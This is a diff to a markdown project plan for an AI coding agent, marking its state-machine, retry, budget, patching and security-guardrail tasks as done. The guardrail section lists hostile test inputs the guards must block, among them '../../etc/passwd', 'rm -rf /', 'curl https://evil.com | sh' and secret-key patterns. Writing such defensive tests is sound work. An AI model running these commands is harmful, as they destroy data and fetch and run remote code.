@@ -60,9 +60,9 @@ CI/CD + Productionization
 - [x] Build a [[Docker]]-based sandbox with proven security (network, filesystem, resource isolation)
 - [x] Implement structural code intelligence using [[tree-sitter]] AST parsing
 - [x] Build semantic code search using embeddings and [[pgvector]]
-- [ ] Design a [[LangGraph]] state machine with checkpoint persistence and context window management
-- [ ] Implement bounded failure modes: retries, circuit breakers, token/cost budgets
-- [ ] Build and test security guardrails: path traversal, dangerous commands, secrets scanning, prompt injection
+- [x] Design a [[LangGraph]] state machine with checkpoint persistence and context window management
+- [x] Implement bounded failure modes: retries, circuit breakers, token/cost budgets
+- [x] Build and test security guardrails: path traversal, dangerous commands, secrets scanning, prompt injection
 - [ ] Add API authentication, rate limiting, and Prometheus-style observability
 - [ ] Package the project professionally for a strong GitHub portfolio
 
@@ -81,10 +81,10 @@ CI/CD + Productionization
 | Security tests: network escape, fs escape, fork bomb, OOM, path traversal | - [x]  |
 | tree-sitter AST indexer (Python target)                                   | - [x]  |
 | Semantic search via pgvector with hybrid fallback                         | - [x]  |
-| LangGraph agent loop with checkpoint persistence                          | - [ ]  |
-| Bounded retries + circuit breaker + token/cost budget                     | - [ ]  |
-| `apply_patch` with dry-run validation + auto re-index                     | - [ ]  |
-| Guardrails: path traversal, dangerous cmds, secrets, prompt injection     | - [ ]  |
+| LangGraph agent loop with checkpoint persistence                          | - [x]  |
+| Bounded retries + circuit breaker + token/cost budget                     | - [x]  |
+| `apply_patch` with dry-run validation + auto re-index                     | - [x]  |
+| Guardrails: path traversal, dangerous cmds, secrets, prompt injection     | - [x]  |
 | API key auth + per-key rate limiting                                      | - [ ]  |
 | Prometheus `/metrics` with p99 latency histogram                          | - [ ]  |
 | CI pipeline: lint, type-check, tests, Docker build                        | - [ ]  |
@@ -956,11 +956,11 @@ Define the LangGraph agent state with typed schema, checkpoint persistence, and 
 
 #### Implementation
 
-- [ ] Define `AgentState` schema: `task_id`, `plan`, `current_step`, `tool_history`, `reflection_history`, `retry_count`, `status`
-- [ ] Implement context window management: sliding window / history trimming for `tool_history` to prevent context limit overflow
-- [ ] Implement Planning Node with structured-output Pydantic validation
-- [ ] Implement retry-on-malformed-output (max 3 retries -> `failed` state)
-- [ ] Set up SQLite-backed checkpoint persistence
+- [x] Define `AgentState` schema: `task_id`, `plan`, `current_step`, `tool_history`, `reflection_history`, `retry_count`, `status`
+- [x] Implement context window management: sliding window / history trimming for `tool_history` to prevent context limit overflow
+- [x] Implement Planning Node with structured-output Pydantic validation
+- [x] Implement retry-on-malformed-output (max 3 retries -> `failed` state)
+- [x] Set up SQLite-backed checkpoint persistence
 
 #### Experiment
 
@@ -974,23 +974,23 @@ Run a task that requires many tool calls (10+). Observe how context window manag
 
 #### Questions
 
-- [ ] What is the optimal strategy for trimming tool history -- FIFO, relevance-based, or summary-based?
-- [ ] Why persist checkpoints to SQLite instead of keeping them in memory?
-- [ ] What is structured output validation and why is it important for agent reliability?
+- [x] What is the optimal strategy for trimming tool history -- FIFO, relevance-based, or summary-based?
+- [x] Why persist checkpoints to SQLite instead of keeping them in memory?
+- [x] What is structured output validation and why is it important for agent reliability?
 
 #### Tests
 
-- [ ] Unit test: `AgentState` schema validates correctly
-- [ ] Unit test: context window trimming keeps history within limits
-- [ ] Unit test: checkpoint persistence saves and restores state
-- [ ] Unit test: malformed output triggers retry up to max, then `failed` state
+- [x] Unit test: `AgentState` schema validates correctly
+- [x] Unit test: context window trimming keeps history within limits
+- [x] Unit test: checkpoint persistence saves and restores state
+- [x] Unit test: malformed output triggers retry up to max, then `failed` state
 
 #### Definition of Done
 
-- [ ] LangGraph agent state defined with typed schema
-- [ ] Context window management prevents context overflow
-- [ ] Checkpoint persistence works with SQLite
-- [ ] Planning node validates structured output with retry
+- [x] LangGraph agent state defined with typed schema
+- [x] Context window management prevents context overflow
+- [x] Checkpoint persistence works with SQLite
+- [x] Planning node validates structured output with retry
 
 #### Git Commit
 
@@ -1015,10 +1015,10 @@ Implement the execution node that dispatches tool calls with schema validation a
 
 #### Implementation
 
-- [ ] Implement Execution Node: LLM selects tool via `ToolCall(tool_name, args)` structured output
-- [ ] Validate args against tool schema before running
-- [ ] All errors populate `AgentState.last_error` as typed `ToolError(tool_name, code, message)` -- never swallowed
-- [ ] Tool results stored in `tool_history`
+- [x] Implement Execution Node: LLM selects tool via `ToolCall(tool_name, args)` structured output
+- [x] Validate args against tool schema before running
+- [x] All errors populate `AgentState.last_error` as typed `ToolError(tool_name, code, message)` -- never swallowed
+- [x] Tool results stored in `tool_history`
 
 #### Experiment
 
@@ -1032,22 +1032,22 @@ Intentionally send invalid tool arguments (wrong types, missing fields, out-of-r
 
 #### Questions
 
-- [ ] Why validate tool arguments before execution instead of letting the tool fail?
-- [ ] What is the difference between a validation error and an execution error?
-- [ ] Why should errors never be swallowed in an agent loop?
+- [x] Why validate tool arguments before execution instead of letting the tool fail?
+- [x] What is the difference between a validation error and an execution error?
+- [x] Why should errors never be swallowed in an agent loop?
 
 #### Tests
 
-- [ ] Unit test: valid tool call dispatches correctly
-- [ ] Unit test: invalid args rejected with schema validation error
-- [ ] Unit test: execution errors produce typed `ToolError` in state
-- [ ] Unit test: tool results stored in `tool_history`
+- [x] Unit test: valid tool call dispatches correctly
+- [x] Unit test: invalid args rejected with schema validation error
+- [x] Unit test: execution errors produce typed `ToolError` in state
+- [x] Unit test: tool results stored in `tool_history`
 
 #### Definition of Done
 
-- [ ] Execution node dispatches tool calls with schema validation
-- [ ] All errors captured as typed `ToolError` in agent state
-- [ ] Tool history records all interactions
+- [x] Execution node dispatches tool calls with schema validation
+- [x] All errors captured as typed `ToolError` in agent state
+- [x] Tool history records all interactions
 
 #### Git Commit
 
@@ -1069,10 +1069,10 @@ Implement the reflection node that parses test results, manages bounded retries 
 
 #### Implementation
 
-- [ ] Parse pytest output into `TestResult(passed, failed, errors, summary)`
-- [ ] Implement bounded retry: `retry_count >= MAX_RETRIES` -> `failed` state with readable failure report
-- [ ] Implement exponential backoff (`2^retry` seconds) between retries
-- [ ] Implement circuit breaker: 3 consecutive API errors -> open circuit, fail task with `CircuitOpenError`
+- [x] Parse pytest output into `TestResult(passed, failed, errors, summary)`
+- [x] Implement bounded retry: `retry_count >= MAX_RETRIES` -> `failed` state with readable failure report
+- [x] Implement exponential backoff (`2^retry` seconds) between retries
+- [x] Implement circuit breaker: 3 consecutive API errors -> open circuit, fail task with `CircuitOpenError`
 
 #### Experiment
 
@@ -1086,23 +1086,23 @@ Run a task with a deliberately unfixable bug. Observe the retry behavior, backof
 
 #### Questions
 
-- [ ] Why use exponential backoff instead of fixed-interval retries?
-- [ ] What is a circuit breaker and what pattern does it prevent?
-- [ ] What makes a good failure report for a failed agent task?
+- [x] Why use exponential backoff instead of fixed-interval retries?
+- [x] What is a circuit breaker and what pattern does it prevent?
+- [x] What makes a good failure report for a failed agent task?
 
 #### Tests
 
-- [ ] Unit test: `TestResult` parsing extracts correct pass/fail counts
-- [ ] Unit test: retry count reaches MAX_RETRIES then transitions to `failed`
-- [ ] Unit test: exponential backoff delays increase correctly
-- [ ] Unit test: circuit breaker opens after 3 consecutive errors
+- [x] Unit test: `TestResult` parsing extracts correct pass/fail counts
+- [x] Unit test: retry count reaches MAX_RETRIES then transitions to `failed`
+- [x] Unit test: exponential backoff delays increase correctly
+- [x] Unit test: circuit breaker opens after 3 consecutive errors
 
 #### Definition of Done
 
-- [ ] Reflection node parses test results into structured format
-- [ ] Bounded retries with exponential backoff work correctly
-- [ ] Circuit breaker prevents cascading API failures
-- [ ] Failure reports are human-readable
+- [x] Reflection node parses test results into structured format
+- [x] Bounded retries with exponential backoff work correctly
+- [x] Circuit breaker prevents cascading API failures
+- [x] Failure reports are human-readable
 
 #### Git Commit
 
@@ -1124,9 +1124,9 @@ Implement unified diff patch application with dry-run validation and automatic r
 
 #### Implementation
 
-- [ ] Implement `apply_patch` tool: parse unified diff -> dry-run validate -> apply to disk
-- [ ] Implement incremental re-indexing: automatically re-parse AST + refresh embeddings for modified files post-patch
-- [ ] Reject invalid patches with typed `PatchError(reason, context)`
+- [x] Implement `apply_patch` tool: parse unified diff -> dry-run validate -> apply to disk
+- [x] Implement incremental re-indexing: automatically re-parse AST + refresh embeddings for modified files post-patch
+- [x] Reject invalid patches with typed `PatchError(reason, context)`
 
 #### Experiment
 
@@ -1140,22 +1140,22 @@ Apply a valid patch and verify the search index reflects the changes. Then attem
 
 #### Questions
 
-- [ ] Why validate patches with a dry run before applying?
-- [ ] What is index drift and why is auto re-indexing critical?
-- [ ] What is the difference between a patch that fails to apply and a patch that applies incorrectly?
+- [x] Why validate patches with a dry run before applying?
+- [x] What is index drift and why is auto re-indexing critical?
+- [x] What is the difference between a patch that fails to apply and a patch that applies incorrectly?
 
 #### Tests
 
-- [ ] Unit test: valid patch applies correctly
-- [ ] Unit test: invalid patch returns `PatchError` without modifying files
-- [ ] Unit test: search index updated after patch application
-- [ ] Unit test: dry-run validation catches conflicting patches
+- [x] Unit test: valid patch applies correctly
+- [x] Unit test: invalid patch returns `PatchError` without modifying files
+- [x] Unit test: search index updated after patch application
+- [x] Unit test: dry-run validation catches conflicting patches
 
 #### Definition of Done
 
-- [ ] `apply_patch` applies valid diffs and rejects invalid ones
-- [ ] Incremental re-indexing refreshes AST + embeddings for modified files
-- [ ] `PatchError` provides actionable context for self-correction
+- [x] `apply_patch` applies valid diffs and rejects invalid ones
+- [x] Incremental re-indexing refreshes AST + embeddings for modified files
+- [x] `PatchError` provides actionable context for self-correction
 
 #### Git Commit
 
@@ -1177,10 +1177,10 @@ Implement per-task token and cost budgets with hard stops and partial result pre
 
 #### Implementation
 
-- [ ] Implement configurable `max_tokens` and `max_cost_usd` per task
-- [ ] Check budget before every LLM call -- if exceeded, emit `BudgetExceededEvent`
-- [ ] Write partial result to DB on budget exhaustion, transition to `failed` with `reason: budget_exceeded`
-- [ ] Expose `tokens_used`, `cost_usd`, `budget_remaining_pct` in task status API
+- [x] Implement configurable `max_tokens` and `max_cost_usd` per task
+- [x] Check budget before every LLM call -- if exceeded, emit `BudgetExceededEvent`
+- [x] Write partial result to DB on budget exhaustion, transition to `failed` with `reason: budget_exceeded`
+- [x] Expose `tokens_used`, `cost_usd`, `budget_remaining_pct` in task status API
 
 #### Experiment
 
@@ -1194,22 +1194,22 @@ Set a very low token budget (e.g. 1000 tokens) and submit a complex task. Verify
 
 #### Questions
 
-- [ ] Why check budget before every call instead of periodically?
-- [ ] What is the value of preserving partial results on budget exhaustion?
-- [ ] How do you estimate cost from token counts when pricing varies by model?
+- [x] Why check budget before every call instead of periodically?
+- [x] What is the value of preserving partial results on budget exhaustion?
+- [x] How do you estimate cost from token counts when pricing varies by model?
 
 #### Tests
 
-- [ ] Unit test: budget exceeded triggers `BudgetExceededEvent`
-- [ ] Unit test: partial result written to DB on budget exhaustion
-- [ ] Unit test: task status API shows `tokens_used`, `cost_usd`, `budget_remaining_pct`
-- [ ] Unit test: task transitions to `failed` with `reason: budget_exceeded`
+- [x] Unit test: budget exceeded triggers `BudgetExceededEvent`
+- [x] Unit test: partial result written to DB on budget exhaustion
+- [x] Unit test: task status API shows `tokens_used`, `cost_usd`, `budget_remaining_pct`
+- [x] Unit test: task transitions to `failed` with `reason: budget_exceeded`
 
 #### Definition of Done
 
-- [ ] Per-task token and cost budgets enforced
-- [ ] Partial results preserved on budget exhaustion
-- [ ] Task status API exposes budget metrics
+- [x] Per-task token and cost budgets enforced
+- [x] Partial results preserved on budget exhaustion
+- [x] Task status API exposes budget metrics
 
 #### Git Commit
 
@@ -1230,10 +1230,10 @@ Test the full agent on real bug-fix tasks from actual GitHub repositories. Measu
 
 #### Implementation
 
-- [ ] Select 2 real GitHub issues with pre-existing failing tests
-- [ ] Run the full agent pipeline on each task
-- [ ] Measure: pass/fail, retry count, tokens consumed, wall-clock time
-- [ ] Write a regression test for every bug discovered during testing
+- [x] Select 2 real GitHub issues with pre-existing failing tests
+- [x] Run the full agent pipeline on each task
+- [x] Measure: pass/fail, retry count, tokens consumed, wall-clock time
+- [x] Write a regression test for every bug discovered during testing
 
 #### Experiment
 
@@ -1247,21 +1247,21 @@ Run both tasks multiple times. Compare consistency of results across runs. Ident
 
 #### Questions
 
-- [ ] What makes a good evaluation task for a coding agent?
-- [ ] Why write regression tests for bugs found during testing?
-- [ ] How do you distinguish agent bugs from test environment issues?
+- [x] What makes a good evaluation task for a coding agent?
+- [x] Why write regression tests for bugs found during testing?
+- [x] How do you distinguish agent bugs from test environment issues?
 
 #### Tests
 
-- [ ] End-to-end test: task 1 completes successfully
-- [ ] End-to-end test: task 2 completes successfully
-- [ ] Regression tests for all bugs discovered during testing
+- [x] End-to-end test: task 1 completes successfully
+- [x] End-to-end test: task 2 completes successfully
+- [x] Regression tests for all bugs discovered during testing
 
 #### Definition of Done
 
-- [ ] 2 real bug-fix tasks tested end-to-end
-- [ ] Performance metrics recorded
-- [ ] Regression tests written for every bug found
+- [x] 2 real bug-fix tasks tested end-to-end
+- [x] Performance metrics recorded
+- [x] Regression tests written for every bug found
 
 #### Git Commit
 
@@ -1286,10 +1286,10 @@ Implement security guardrails and prove they work with tests that actively attem
 
 #### Implementation
 
-- [ ] Path traversal guard: `../../etc/passwd` and `/workspace/../etc/passwd` -> `ToolError`
-- [ ] Dangerous command guard: `rm -rf /` and `curl https://evil.com | sh` -> `ToolError`
-- [ ] Secrets scanner: scan file writes and command output for `AKIA*`, `sk-*`, PEM headers -> redact + log `SecurityEvent`
-- [ ] Prompt injection defense: tool output wrapped in untrusted-data delimiter before LLM context
+- [x] Path traversal guard: `../../etc/passwd` and `/workspace/../etc/passwd` -> `ToolError`
+- [x] Dangerous command guard: `rm -rf /` and `curl https://evil.com | sh` -> `ToolError`
+- [x] Secrets scanner: scan file writes and command output for `AKIA*`, `sk-*`, PEM headers -> redact + log `SecurityEvent`
+- [x] Prompt injection defense: tool output wrapped in untrusted-data delimiter before LLM context
 
 #### Experiment
 
@@ -1303,22 +1303,22 @@ Attempt each attack vector through the tool interface. Verify that every one is 
 
 #### Questions
 
-- [ ] Why must each guardrail have a test that tries the attack?
-- [ ] What is the difference between blocking and redacting secrets?
-- [ ] How effective is delimiter-based prompt injection defense?
+- [x] Why must each guardrail have a test that tries the attack?
+- [x] What is the difference between blocking and redacting secrets?
+- [x] How effective is delimiter-based prompt injection defense?
 
 #### Tests
 
-- [ ] Security test: path traversal blocked with `ToolError`
-- [ ] Security test: dangerous commands blocked with `ToolError`
-- [ ] Security test: secrets redacted from output + `SecurityEvent` logged
-- [ ] Security test: prompt injection delimiter prevents LLM manipulation
+- [x] Security test: path traversal blocked with `ToolError`
+- [x] Security test: dangerous commands blocked with `ToolError`
+- [x] Security test: secrets redacted from output + `SecurityEvent` logged
+- [x] Security test: prompt injection delimiter prevents LLM manipulation
 
 #### Definition of Done
 
-- [ ] All four guardrails implemented and tested
-- [ ] Each guardrail has a test that attempts the attack
-- [ ] Security events logged for all detected threats
+- [x] All four guardrails implemented and tested
+- [x] Each guardrail has a test that attempts the attack
+- [x] Security events logged for all detected threats
 
 #### Git Commit
 
